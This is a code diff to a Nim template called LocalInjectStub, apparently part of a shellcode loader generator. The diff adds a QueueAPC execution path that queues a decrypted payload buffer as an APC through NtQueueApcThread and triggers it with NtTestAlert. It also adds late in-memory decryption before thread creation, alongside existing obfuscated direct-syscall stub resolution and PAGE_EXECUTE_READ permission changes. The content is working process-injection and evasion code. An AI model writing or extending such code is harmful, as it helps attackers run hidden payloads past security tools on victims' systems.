@@ -54,6 +54,7 @@ let LocalInjectStub*  = """
             
             success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
             success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
+
             when defined(LocalCreateThread):
                 var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
                 # define NtCreateThreadEx
@@ -150,9 +151,36 @@ let LocalInjectStub*  = """
                 when defined(verbose):
                     echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
                 quit(1)
+        
+
+        when defined(QueueAPC):
+            var tHandle: HANDLE = -2
+            #when defined(Hellsgate):
+                # Todo
+            
+            let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](buffer)
+            status = NtQueueApcThread(tHandle, pfnAPC, buffer, nil, nil)
+            when defined(verbose):
+                echo obf("[*] NtQueueApcThread: "), toHex(status)
+            
+            #when defined(Hellsgate):
+                # Todo
+            
+            status = NtTestAlert()
+            when defined(verbose):
+                echo obf("[*] NtTestAlert: "), toHex(status)
+            return
+
 
         when defined(LocalCreateThread):
             var tHandle: HANDLE
+            when not defined(RX):
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                ptrEncText = cast[ptr byte](buffer)
+                ptrDecText = cast[ptr byte](buffer)
+                decryptLate()
+
             when defined(SysWhispers):
                 when not defined(RX):
                     when defined(sleepinbetween):
